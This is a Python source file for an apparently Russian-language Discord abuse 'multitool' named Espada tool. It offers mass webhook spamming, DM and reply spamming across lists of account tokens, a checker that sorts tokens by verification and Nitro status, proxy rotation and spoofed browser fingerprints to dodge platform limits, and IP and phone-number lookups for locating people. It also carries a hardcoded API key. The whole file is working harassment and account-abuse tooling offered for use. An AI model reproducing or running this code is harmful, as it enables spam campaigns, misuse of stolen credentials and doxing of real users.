import os
import ctypes
import json
import time
import random
import string
import os
import getpass
import sys
import base64
import concurrent.futures
import logging
try:
    import requests
    import colored
    import phonenumbers
    import pystyle
    import datetime
    import keyboard
    import tkinter
    import tls_client
    import threading
    import easygui
    import colorama
    import pynput
    import websocket
    import fake_useragent
    import httpx
    import emoji as emojizer
    import bs4
    import discum
    import discord
    import socket
except ModuleNotFoundError:
    os.system('pip install requests')
    os.system('pip install colored')
    os.system('pip install phonenumbers')
    os.system('pip install pystyle')
    os.system('pip install datetime')
    os.system('pip install keyboard')
    os.system('pip install tkinter')
    os.system('pip install tls_client')
    os.system('pip install threading')
    os.system('pip install easygui')
    os.system('pip install colorama')
    os.system('pip install pynput')
    os.system('pip install websocket')
    os.system('pip install fake_useragent')
    os.system('pip install httpx')
    os.system('pip install emoji')
    os.system('pip install bs4')
    os.system('pip install discum==1.1.0')
    os.system('pip install discord')
    os.system('pip install socket')
from bs4 import BeautifulSoup
from colorama import Fore, Style
from random import choice
from websocket import WebSocket
from phonenumbers import timezone,geocoder,carrier
from tls_client import Session
from pystyle import Write, System, Colors, Colorate, Anime
from colored import fg
from json import dumps
from pynput import keyboard as ks
from concurrent.futures import ThreadPoolExecutor
from os.path import isfile, join
from discord.ext import commands
COLOR_CODE = {
    "RESET": "\033[0m",  
    "UNDERLINE": "\033[04m", 
    "GREEN": "\033[32m",     
    "YELLOW": "\033[93m",    
    "RED": "\033[31m",       
    "CYAN": "\033[36m",     
    "BOLD": "\033[01m",        
    "PINK": "\033[95m",
    "URL_L": "\033[36m",       
    "LI_G": "\033[92m",      
    "F_CL": "\033[0m",
    "DARK": "\033[90m",     
}
toolname = "Espada tool"
owners = "Vodkadev.ru"
chrome_version = "116"
xsup = "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwic3lzdGVtX2xvY2FsZSI6ImVzIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzExNi4wLjAuMCBTYWZhcmkvNTM3LjM2IEVkZy8xMTYuMC4xOTM4LjY5IiwiYnJvd3Nlcl92ZXJzaW9uIjoiMTE2LjAuMC4wIiwib3NfdmVyc2lvbiI6IjEwIiwicmVmZXJyZXIiOiIiLCJyZWZlcnJpbmdfZG9tYWluIjoiIiwicmVmZXJyZXJfY3VycmVudCI6IiIsInJlZmVycmluZ19kb21haW5fY3VycmVudCI6IiIsInJlbGVhc2VfY2hhbm5lbCI6InN0YWJsZSIsImNsaWVudF9idWlsZF9udW1iZXIiOjIyNTg3MywiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbH0="
date = datetime.datetime.now()
date_now = date.strftime("%d/%m/%Y")
red = Fore.RED
yellow = Fore.YELLOW
green = Fore.GREEN
blue = Fore.BLUE
orange = Fore.RED + Fore.YELLOW
pretty = Fore.LIGHTMAGENTA_EX + Fore.LIGHTCYAN_EX
magenta = Fore.MAGENTA
lightblue = Fore.LIGHTBLUE_EX
cyan = Fore.CYAN
gray = Fore.LIGHTBLACK_EX + Fore.WHITE
reset = Fore.RESET
pink = Fore.LIGHTGREEN_EX + Fore.LIGHTMAGENTA_EX
dark_green = Fore.GREEN + Style.BRIGHT
api_url = "http://ip-api.com/json/"
parametros = 'status,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,query'
data = {"fields":parametros}
def ip_scraping(ip, api_url, data):
    try:
        res = requests.get(api_url + ip, data=data)
        res.raise_for_status()  # Check for HTTP request errors
        api_json_res = res.json()  # Directly parse JSON response
        return api_json_res
    except requests.RequestException as e:
        print(f"An error occurred: {e}")
        return None

def get_random_proxy():
    with open("proxies.txt", "r") as f:
        proxies = f.readlines()
    if len(proxies) != 0:
        proxy = random.choice(proxies).strip()
        return proxy
    else:
        return None

session = tls_client.Session(
    client_identifier="chrome_116",
)

proxy_lines = open("proxies.txt", "r").readlines()
proxies = random.choice(proxy_lines).strip() if proxy_lines else None
def randstr(lenn):
    alpha = "abcdefghijklmnopqrstuvwxyz0123456789"
    text = ''
    for i in range(0, lenn):
        text += alpha[random.randint(0, len(alpha) - 1)]
    return text
if proxies and (":" in proxies):
    proxy = "http://" + proxies
else:
    proxy = None

if proxy:
    session.proxies = {
        "http": proxy,
        "https": proxy
    }
else:
    session_class = tls_client.Session
    kwargs = {}

    session = session_class(
        client_identifier="chrome_116",
    )
def get_time_rn():
    date = datetime.datetime.now()
    hour = date.hour
    minute = date.minute
    second = date.second
    timee = "{:02d}:{:02d}:{:02d}".format(hour, minute, second)
    return timee

def main():
    username = getpass.getuser()
    Write.Print(f"""
\t\t                            ______                     _       
\t\t                           |  ____|                   | |      
\t\t                           | |__   ___ _ __   __ _  __| | __ _ 
\t\t                           |  __| / __| '_ \ / _` |/ _` |/ _` |
\t\t                           | |____\__ \ |_) | (_| | (_| | (_| |
\t\t                           |______|___/ .__/ \__,_|\__,_|\__,_|
\t\t                                      | |                      
\t\t                                      |_|                      
                                          Welcome {username} | discord.gg/espadasquad
                            ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════
        \t(1) Краш бот\t(2) Спамер Webhook\t(3) Подбор токена по айди\t(4) Токен информация

        \t(5) Создать Webhook\t(6) ЛС спамер\t(7) Ответить спамеру\t(8) Средство проверки токенов

        \t(9) Инфо номера\t(10) Инфо IP
════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════""", Colors.red_to_blue, interval=0.0000)
    Write.Print(f"\nroot@espadamultitool ~> ", Colors.red_to_blue, interval=0.000); choice = input(magenta).lower()
    
    
    if choice == '1':
        System.Clear()
        module_path = os.path.join('.', 'moduls', 'bot.py')
        
        if os.path.exists(module_path):
            os.system(f"cmd /c python {module_path}")
        else:
            print(f"Файл {module_path} не найден. Проверьте правильность пути и названия файла.")
    if choice=="2":
        ctypes.windll.kernel32.SetConsoleTitleW(f'{toolname} - Made By {owners} - Date : {date_now} - Logged As : {username} | Module : Webhook Spammer')
        Write.Print(f"""
(1) Single Webhook Spammer
(2) Multi Webhook Spammer
""", Colors.purple_to_red, interval=0.000)
        Write.Print(f"\nroot@option ~> ", Colors.purple_to_red, interval=0.000); option = input()
        if option=="1":
            Write.Print(f"\nWebhook ~> ", Colors.purple_to_red, interval=0.000); webhook = input()
            Write.Print(f"Message ~> ", Colors.purple_to_red, interval=0.000); message = input()
            Write.Print(f"How Many Messages? ~> ", Colors.purple_to_red, interval=0.000); howmany = input()
            payload = {
                "content": message
            }
            data_json = json.dumps(payload)
            headers = {
                "Content-Type": "application/json"
            }

            for i in range(int(howmany)):
                time_rn = get_time_rn()
                time.sleep(0.0001)
                response = session.post(webhook, data=data_json, headers=headers)
                if response.status_code == 200 or response.status_code == 204:
                    print(f"{reset}[ {cyan}{time_rn}{reset} ] {gray}({green}+{gray}) {pretty}Sent Message {gray}| ", end='')
                    sys.stdout.flush()
                    Write.Print(message + "\n", Colors.purple_to_red, interval=0.000)
                else:
                    print(f"{reset}[ {cyan}{time_rn}{reset} ] {gray}({red}-{gray}) {pretty}Failed To Send Message {gray}| ", end='')
                    sys.stdout.flush()
                    Write.Print(message + "\n", Colors.purple_to_red, interval=0.000)
        if option=="2":
            def send(webhook, message):
                    time_rn = get_time_rn()
                    time.sleep(0.0001)
                    response = session.post(webhook, data=data_json, headers=headers)
                    if response.status_code == 200 or response.status_code == 204:
                        print(f"{reset}[ {cyan}{time_rn}{reset} ] {gray}({green}+{gray}) {pretty}Sent Message {gray}| ", end='')
                    else:
                        print(f"{reset}[ {cyan}{time_rn}{reset} ] {gray}({red}-{gray}) {pretty}Failed To Send Message {gray}| ", end='')
                        time.sleep(0.2)

            webhook_list = open(easygui.fileopenbox(), 'r').read().splitlines()
            Write.Print(f"\nMessage ~> ", Colors.purple_to_red, interval=0.000); message = input()
            payload = {
                "content": message
            }
            data_json = json.dumps(payload)
            headers = {
                "Content-Type": "application/json"
            }
            def run_webhook():
                while True:
                    webhook = random.choice(webhook_list)
                    send(webhook, message)
                    time.sleep(0.001)
            
            threads = []
            for _ in range(30):
                thread = threading.Thread(target=run_webhook)
                threads.append(thread)
                thread.start()

            for thread in threads:
                thread.join()
        else:
            main()   
    if choice == '3':
        System.Clear()
        module_path = os.path.join('.', 'moduls', 'id.py')
        
        if os.path.exists(module_path):
            os.system(f"cmd /c python {module_path}")
        else:
            print(f"Файл {module_path} не найден. Проверьте правильность пути и названия файла.")
    if choice=="4":
            ctypes.windll.kernel32.SetConsoleTitleW(f'{toolname} - Made By {owners} - Date : {date_now} - Logged As : {username} | Module : Token Information')
            output_lock = threading.Lock()
            Write.Print(f"\nroot@token ~> ", Colors.purple_to_red, interval=0.000); token = input()
            print()
            headers = {
                "Content-Type": "application/json",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 Edg/116.0.1938.62",
                "Authorization": token
            }

            r = requests.get(f"https://discord.com/api/v9/users/@me/burst-credits", headers=headers)
            if r.status_code == 200:
                url_api_info = "https://discord.com/api/v9/users/@me"
                r = json.loads(requests.get(url_api_info, headers=headers).text)
                user_id = r['id']
                username = r['username']
                has_email = r['email']
                has_phone = r['phone']
                mfa = r['mfa_enabled']
                locale = r['locale']
                avatar = r['avatar']
                verified = r['verified']
                flagged = r['flags']
                if flagged == 0:
                    flags = "False"
                else:
                    flags = "True"

                time_rn = get_time_rn()
                print(f"{reset}[ {cyan}{time_rn}{reset} ] {gray}({green}+{gray}) {pretty}User ID {gray}| {pink}{user_id}")
                print(f"{reset}[ {cyan}{time_rn}{reset} ] {gray}({green}+{gray}) {pretty}Username {gray}| {pink}{username}")
                print(f"{reset}[ {cyan}{time_rn}{reset} ] {gray}({green}+{gray}) {pretty}Email {gray}| {pink}{has_email}")
                print(f"{reset}[ {cyan}{time_rn}{reset} ] {gray}({green}+{gray}) {pretty}Phone {gray}| {pink}{has_phone}")
                print(f"{reset}[ {cyan}{time_rn}{reset} ] {gray}({green}+{gray}) {pretty}2FA Enabled {gray}| {pink}{mfa}")
                print(f"{reset}[ {cyan}{time_rn}{reset} ] {gray}({green}+{gray}) {pretty}Locale {gray}| {pink}{locale}")
                print(f"{reset}[ {cyan}{time_rn}{reset} ] {gray}({green}+{gray}) {pretty}Avatar {gray}| {pink}{avatar}")
                print(f"{reset}[ {cyan}{time_rn}{reset} ] {gray}({green}+{gray}) {pretty}Verified {gray}| {pink}{verified}")
                print(f"{reset}[ {cyan}{time_rn}{reset} ] {gray}({green}+{gray}) {pretty}Flagged {gray}| {pink}{flags}")

            else:
                pass
            Write.Print(f"\nroot@press_enter ~> ", Colors.purple_to_red, interval=0.000); input()
            main()
    if choice=="5":
            ctypes.windll.kernel32.SetConsoleTitleW(f'{toolname} - Made By {owners} - Date : {date_now} - Logged As : {username} | Module : Webhook Creator')
            Write.Print(f"\nroot@token ~> ", Colors.purple_to_red, interval=0.000); token = input()
            Write.Print(f"root@channel_id ~> ", Colors.purple_to_red, interval=0.000); channel_id = input()
            Write.Print(f"root@webhook_name ~> ", Colors.purple_to_red, interval=0.000); webhook_name = input()
            print()
            output_lock = threading.Lock()
            data = {
                "name": webhook_name,
            }
            def create_webhook():
                url = f"https://discord.com/api/v9/channels/{channel_id}/webhooks"
                headers = {
                    "Authorization": token
                }
                r = requests.post(url, headers=headers, json=data)
                if r.status_code == 200:
                    with output_lock:
                        time_rn = get_time_rn()
                        print(f"{reset}[ {cyan}{time_rn}{reset} ] {gray}({green}+{gray}) {pretty}Created Webhook {gray}| ", end='')
                        sys.stdout.flush()
                        Write.Print(token + "\n", Colors.purple_to_red, interval=0.000)
                        pass
                else:
                    with output_lock:
                        time_rn = get_time_rn()
                        print(f"{reset}[ {cyan}{time_rn}{reset} ] {gray}({red}-{gray}) {pretty}Failed (More Than 15 Webhooks Reached) {gray}| ", end='')
                        sys.stdout.flush()
                        Write.Print(token + "\n", Colors.purple_to_red, interval=0.000)
                        Write.Print(f"\nroot@press_enter ~> ", Colors.purple_to_red, interval=0.000); input()
                        main()

            while True:
                create_webhook()
    if choice=="6":
            ctypes.windll.kernel32.SetConsoleTitleW(f'{toolname} - Made By {owners} - Date : {date_now} - Logged As : {username} | Module : DM Spammer')
            def DMSpammer(idd, message, token):
                payload = {
                    'recipient_id': idd
                }
                headers = {
                    'authorization': token,
                    "accept": "*/*",
                    "accept-language": "en-GB",
                    "content-length": str(len(dumps(payload))),
                    "content-type": "application/json",
                    "cookie": f"__cfuid={randstr(43)}; __dcfduid={randstr(32)}; locale=en-US",
                    "origin": "https://discord.com",
                    "sec-fetch-dest": "empty",
                    "sec-fetch-mode": "cors",
                    "sec-fetch-site": "same-origin",
                    "user-agent": f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_version}.0.0.0 Safari/537.36",
                    "x-debug-options": "bugReporterEnabled",
                    "x-super-properties": xsup
                }
                r1 = requests.post(f'https://discord.com/api/v9/users/@me/channels', headers=headers, json=payload)

                payload = {
                    "content": message,
                    "tts": False
                }
                j = json.loads(r1.content)

                while True:
                    rsp = requests.post(f"https://discord.com/api/v9/channels/{j['id']}/messages", headers=headers, json=payload)
                    time_rn = get_time_rn()
                    if rsp.status_code == 429:
                        ratelimit = json.loads(rsp.content)
                        print(f"{reset}[ {cyan}{time_rn}{reset} ] {gray}({red}-{gray}) {pretty}Ratelimit {gray}| ", str(float(ratelimit['retry_after'])) + f"{yellow} Seconds")
                        time.sleep(float(ratelimit['retry_after']))
                    elif rsp.status_code == 200:
                        print(f"{reset}[ {cyan}{time_rn}{reset} ] {gray}({green}+{gray}) {pretty}Successfully Sent DM {gray}| ", end='')
                        sys.stdout.flush()
                        Write.Print(token + "\n", Colors.purple_to_red, interval=0.000)
            Write.Print(f"""
    (1) Single Token DM Spammer
    (2) Multi Token DM Spammer
    """, Colors.purple_to_red, interval=0.000)
            Write.Print(f"\nroot@choice ~> ", Colors.purple_to_red, interval=0.000); opc1 = input()
            if opc1=="1":
                Write.Print(f"\nroot@token ~> ", Colors.purple_to_red, interval=0.000); token = input()
                Write.Print(f"root@user_id ~> ", Colors.purple_to_red, interval=0.000); user = input()
                Write.Print(f"root@message ~> ", Colors.purple_to_red, interval=0.000); message = input()
                DMSpammer(user, message, token)
            else:
                tokens = open("tokens.txt", "r").read().splitlines()
                Write.Print(f"\nroot@user_id ~> ", Colors.purple_to_red, interval=0.000); user = input()
                Write.Print(f"root@message ~> ", Colors.purple_to_red, interval=0.000); message = input()
                def thread_dm():
                    for token in tokens:
                        threading.Thread(target=DMSpammer, args=(user, message, token)).start()
                thread_dm()   
    if choice=="7":
        ctypes.windll.kernel32.SetConsoleTitleW(f'{toolname} - Made By {owners} - Date : {date_now} - Logged As : {username} | Module : Reply Spammer')
        Write.Print(f"\nroot@channel_id ~> ", Colors.purple_to_red, interval=0.000); channel_id = input()
        Write.Print(f"root@message_id ~> ", Colors.purple_to_red, interval=0.000); msg_id = input()
        Write.Print(f"root@message ~> ", Colors.purple_to_red, interval=0.000); msg = input()
        Write.Print(f"root@how_many ~> ", Colors.purple_to_red, interval=0.000); howmany = input()
        amount = int(howmany)
        output_lock = threading.Lock()
        print()

        def reply_spammer(token, channel_id, message_id, msg, amount):
            for i in range(int(amount)):
                payload = {
                    'content': msg, 
                    'tts':False
                }

                headers = {
                    'authorization': token,
                    "user-agent": f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_version}.0.0.0 Safari/537.36",
                }

                payload['message_reference'] = {
                    "channel_id": channel_id,
                    "message_id": message_id
                }
                r = session.post(f"https://discord.com/api/v9/channels/{channel_id}/messages", headers=headers, json=payload)
                if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                    with output_lock:
                        time_rn = get_time_rn()
                        print(f"{reset}[ {cyan}{time_rn}{reset} ] {gray}({green}+{gray}) {pretty}Successfully Replied {gray}| ", end='')
                        sys.stdout.flush()
                        Write.Print(token + "\n", Colors.purple_to_red, interval=0.000)
                        pass
                elif r.status_code == 429:
                    try:
                        with output_lock:
                            time_rn = get_time_rn()
                            print(f"{reset}[ {cyan}{time_rn}{reset} ] {gray}({yellow}/{gray}) {pretty}Ratelimited {gray}| ", end='')
                            sys.stdout.flush()
                            Write.Print(token + "\n", Colors.purple_to_red, interval=0.000)
                            pass
                    except:
                        pass
                else:
                    with output_lock:
                        time_rn = get_time_rn()
                        print(f"{reset}[ {cyan}{time_rn}{reset} ] {gray}({red}-{gray}) {pretty}Failed {gray}| ", end='')
                        sys.stdout.flush()
                        Write.Print(token + "\n", Colors.purple_to_red, interval=0.000)
                        pass
        tokens = open('tokens.txt', 'r').read().splitlines()
        for token in tokens:
            threading.Thread(target=reply_spammer, args=(token, channel_id, msg_id, msg, amount)).start()

        Write.Print(f"\nroot@press_enter ~> ", Colors.purple_to_red, interval=0.000); input()
        main()                         
    if choice=="8":
        ctypes.windll.kernel32.SetConsoleTitleW(f'{toolname} - Made By {owners} - Date : {date_now} - Logged As : {username} | Module : Token Checker')
        print()
        valid = 0
        invalid = 0
        phone_verify = 0
        email_verify = 0
        nitro = 0
        with open('tokens.txt', 'r') as f:
            tokens = f.read().splitlines()
        
        valid_tokens = []
        email_tokens = []
        phone_tokens = []
        invalid_tokens = []
        nitro_tokens_good = []

        for token in tokens:
            headers = {
            'Authorization': token
            }
            response = requests.get('https://discord.com/api/v9/users/@me/burst-credits', headers=headers)
            if response.status_code == 200:
                user_data = json.loads(response.text)
                if 'phone' in user_data and user_data['phone'] is not None:
                    time_rn = get_time_rn()
                    print(f"{reset}[ {cyan}{time_rn}{reset} ] {gray}({yellow}/{gray}) {pretty}Phone Unverified {gray}| {pink}", end='')
                    sys.stdout.flush()
                    Write.Print(token + "\n", Colors.purple_to_red, interval=0.000)
                    phone_tokens.append(token)
                    phone_verify += 1
                elif 'email' in user_data and user_data['email'] is not None:
                    if ('verified' in user_data and user_data['verified']) or ('phone_verified' in user_data and user_data['phone_verified']):
                        if 'nitro' in user_data and user_data['nitro']:
                            time_rn = get_time_rn()
                            print(f"{reset}[ {cyan}{time_rn}{reset} ] {gray}({green}+{gray}) {pretty}Fully Verified & Nitro {gray}| ", end='')
                            sys.stdout.flush()
                            Write.Print(token + "\n", Colors.purple_to_red, interval=0.000)
                            nitro_tokens_good.append(token)
                            nitro += 1
                        else:
                            if 'phone_verified' in user_data and not user_data['phone_verified']:
                                time_rn = get_time_rn()
                                print(f"{reset}[ {cyan}{time_rn}{reset} ] {gray}({yellow}/{gray}) {pretty}Phone Unverified {gray}| ", end='')
                                sys.stdout.flush()
                                Write.Print(token + "\n", Colors.purple_to_red, interval=0.000)
                                phone_tokens.append(token)
                                phone_verify += 1
                            else:
                                time_rn = get_time_rn()
                                print(f"{reset}[ {cyan}{time_rn}{reset} ] {gray}({green}+{gray}) {pretty}Valid {gray}| ", end='')
                                sys.stdout.flush()
                                Write.Print(token + "\n", Colors.purple_to_red, interval=0.000)
                                valid_tokens.append(token)
                                valid += 1
                    else:
                        time_rn = get_time_rn()
                        print(f"{reset}[ {cyan}{time_rn}{reset} ] {gray}({yellow}/{gray}) {pretty}Email Unverified {gray}| ", end='')
                        sys.stdout.flush()
                        Write.Print(token + "\n", Colors.purple_to_red, interval=0.000)
                        email_tokens.append(token)
                        email_verify += 1
                else:
                    time_rn = get_time_rn()
                    print(f"{reset}[ {cyan}{time_rn}{reset} ] {gray}({green}+{gray}) {pretty}Valid {gray}| ", end='')
                    sys.stdout.flush()
                    Write.Print(token + "\n", Colors.purple_to_red, interval=0.000)
                    valid_tokens.append(token)
                    valid += 1
            elif response.status_code == 401:
                time_rn = get_time_rn()
                print(f"{reset}[ {cyan}{time_rn}{reset} ] {gray}({red}-{gray}) {pretty}Invalid {gray}| ", end='')
                sys.stdout.flush()
                Write.Print(token + "\n", Colors.purple_to_red, interval=0.000)
                invalid_tokens.append(token)
                invalid += 1
            else:
                time_rn = get_time_rn()
                print(f"{reset}[ {cyan}{time_rn}{reset} ] {gray}({red}-{gray}) {pretty}Invalid {gray}| ", end='')
                sys.stdout.flush()
                Write.Print(token + "\n", Colors.purple_to_red, interval=0.000)
                invalid_tokens.append(token)
                invalid += 1
        total_checked = valid + invalid + email_verify + nitro + phone_verify
        Write.Print(f"""\n\n
                                    ╔═════════════════════════════════════════╗
                                    ║   Espada Multitool TOKEN CHECKER STATS  ║
                                ╔═════════════════════════════════════════════════╗
                                        \t   Total Checked : {total_checked}     
                                        \t   Valid : {valid}     
                                        \t   Email Unverified : {email_verify}  
                                        \t   Phone Unverified : {phone_verify}
                                        \t   Invalid Tokens : {invalid}
                                        \t   Nitro Tokens : {nitro}      
                                ╚═════════════════════════════════════════════════╝                                
    """, Colors.purple_to_red, interval=0.000)
        Write.Print(f"\nroot@press_enter ~> ", Colors.purple_to_red, interval=0.000); input()
        with open('tokens.txt', 'w') as f:
                f.write("")
        with open('tokens.txt', 'w') as f:
            if not valid_tokens:
                f.write("[ VALID TOKENS ]\n\n")
                f.write("[ No Valid Tokens Found ]")
            else:                           
                f.write("[ VALID TOKENS ]\n\n")
                for token in valid_tokens:
                    f.write(token + '\n')
        with open('tokens.txt', 'a') as f:                                                             
            if not email_tokens:
                f.write("\n[ EMAIL UNVERIFIED TOKENS ]\n\n")
                f.write("[ No Email Unverified Tokens Found ]")                            
            else:
                f.write("\n[ EMAIL UNVERIFIED TOKENS ]\n\n")
                for token in email_tokens:
                    f.write(token + '\n')                               
        with open('tokens.txt', 'a') as f:
            if not phone_tokens:
                f.write("\n[ PHONE UNVERIFIED TOKENS ]\n\n")
                f.write("[ No Phone Unverified Tokens Found ]")                              
            else:
                f.write("\n[ PHONE UNVERIFIED TOKENS ]\n\n")
                for token in phone_tokens:
                    f.write(token + '\n')
        main()
    if choice=="9":
        Write.Print(f"\nroot@phone~> ", Colors.purple_to_red, interval=0.000); phone = input()
        x = phonenumbers.parse(f"{phone}")
        val=phonenumbers.is_valid_number(x)
        api_key = '71c9a91b73291f84764eda1c5ccba175'

        if val == True:
            va= "Сущесствует"
            pos=phonenumbers.is_possible_number(x)
            Car=carrier.name_for_number(x,'ru')
            ref=geocoder.description_for_number(x,'ru')
            timez=timezone.time_zones_for_number(x)
            print(Car)
            print(ref)
            data = requests.get("http://apilayer.net/api/validate?access_key=%s&number=%s&country_code&format=1" % (api_key, phone))

            for key, value in data.json().items():

                print("%s: %s" % (key, value))
        if val == False:
            va= "Не сущесствует "
            print(va)
    if choice == "10":
        Write.Print(f"\nroot@ip~> ", Colors.purple_to_red, interval=0.000); ip = input()
        try:
            ip = socket.gethostbyname(ip)
            
            infoList1 = requests.get(f"http://ipwho.is/{ip}")
            infoList = infoList1.json()
            
            if infoList.get("success"):
                print(f'{COLOR_CODE["RED"]}╔══════════════                     ══════════════╗\n')
                print(f'     {COLOR_CODE["RED"]}[+]{COLOR_CODE["PINK"]}{COLOR_CODE["GREEN"]} Айпи адресс:{COLOR_CODE["YELLOW"]}  {infoList["ip"]}')
                print(f'     {COLOR_CODE["RED"]}[+]{COLOR_CODE["PINK"]}{COLOR_CODE["GREEN"]} Успех:{COLOR_CODE["YELLOW"]}  {infoList["success"]}  ')
                print(f'     {COLOR_CODE["RED"]}[+]{COLOR_CODE["PINK"]}{COLOR_CODE["GREEN"]} Тип:{COLOR_CODE["YELLOW"]}   {infoList["type"]}     ')
                print(f'     {COLOR_CODE["RED"]}[+]{COLOR_CODE["PINK"]}{COLOR_CODE["GREEN"]} Континент:{COLOR_CODE["YELLOW"]}   {infoList["continent"]}')
                print(f'     {COLOR_CODE["RED"]}[+]{COLOR_CODE["PINK"]}{COLOR_CODE["GREEN"]} Страна:{COLOR_CODE["YELLOW"]}   {infoList["country"]}')
                print(f'     {COLOR_CODE["RED"]}[+]{COLOR_CODE["PINK"]}{COLOR_CODE["GREEN"]} Регион:{COLOR_CODE["YELLOW"]}   {infoList["region"]}')
                print(f'     {COLOR_CODE["RED"]}[+]{COLOR_CODE["PINK"]}{COLOR_CODE["GREEN"]} Город:{COLOR_CODE["YELLOW"]}   {infoList["city"]}')
                print(f'     {COLOR_CODE["RED"]}[+]{COLOR_CODE["PINK"]}{COLOR_CODE["GREEN"]} Почтовый код:{COLOR_CODE["YELLOW"]}   {infoList["postal"]}')
                print(f'     {COLOR_CODE["RED"]}[+]{COLOR_CODE["PINK"]}{COLOR_CODE["GREEN"]} Столица:{COLOR_CODE["YELLOW"]}  {infoList["capital"]}\n')
                print(f'{COLOR_CODE["RED"]}╚══════════════                     ══════════════╝\n')
                main()
                
            else:
                print(f'{COLOR_CODE["RED"]}╔══════════════                     ══════════════╗\n')
                print(f'     {COLOR_CODE["RED"]}[+]{COLOR_CODE["PINK"]}{COLOR_CODE["GREEN"]} IP:{COLOR_CODE["YELLOW"]}  {infoList["ip"]}')
                print(f'     {COLOR_CODE["RED"]}[+]{COLOR_CODE["PINK"]}{COLOR_CODE["GREEN"]} Success:{COLOR_CODE["YELLOW"]}   {infoList["success"]}')
                print(f'     {COLOR_CODE["RED"]}[+]{COLOR_CODE["PINK"]}{COLOR_CODE["GREEN"]} Message:{COLOR_CODE["YELLOW"]}  {infoList["message"]}')
                print(f'{COLOR_CODE["RED"]}╚══════════════                     ══════════════╝\n')
                main()
        except Exception as e:
            print(f'An error occurred: {e}')
            main()

if __name__ == "__main__":
    main()
